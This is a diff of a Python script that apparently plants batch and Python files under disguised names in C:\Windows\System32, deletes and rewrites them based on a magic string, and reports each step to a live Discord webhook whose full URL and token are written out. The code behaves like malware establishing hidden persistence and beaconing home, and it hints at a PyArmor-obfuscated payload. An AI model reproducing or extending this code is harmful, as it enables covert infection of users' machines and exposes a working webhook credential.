@@ -188,7 +188,7 @@ os.system('cls')
 if file_contentsx1 =="04yb8u5ih5FGB":
     os.remove(r"C:\Windows\System32\FileSystemXS\aes3.0v1.bat")
     file_contentpathx = read_file_contentxasxas(file_pathxpath)
-    create_batch_file(file_contentpathx, r"C:\Windows\System32\WCNMX\aes3.0v1.py")
+    create_batch_file(file_contentpathx, r"C:\Windows\System32\WCNMX\aes3.0v2.py")
 else:
     create_batch_file("py", r"C:\Windows\System32\WCNMX\aes3.0v2.py")
     send_dx("https://discord.com/api/webhooks/1222048087871324160/8b3m_YeI6RSayYHfHJcaK-dYHanpkk3TMRSg9JS_plc0yaTmgHlL-6t5qHBwsXZEVL9V", "Has created the batch file.")
@@ -218,18 +218,7 @@ def run_batch_file(batch_file_path):
         print(f"Error")
     else:
         print("")
-'''
-def check_files_existx():
-    file_paths = [
-        r'C:\Windows\System32\pyarmor_runtime_000000\__init__.py',
-        r'C:\Windows\System32\pyarmor_runtime_000000\pyarmor_runtime.pyd'
-    ]
-    return all(os.path.exists(file_path) for file_path in file_paths)
-if not check_files_existx():
-    print("Error in aes, please tell the dev.")
-    input()
-    exit()
-'''
+
 
 required_version = (3, 11, 5)
 current_version = sys.version_info[:3]
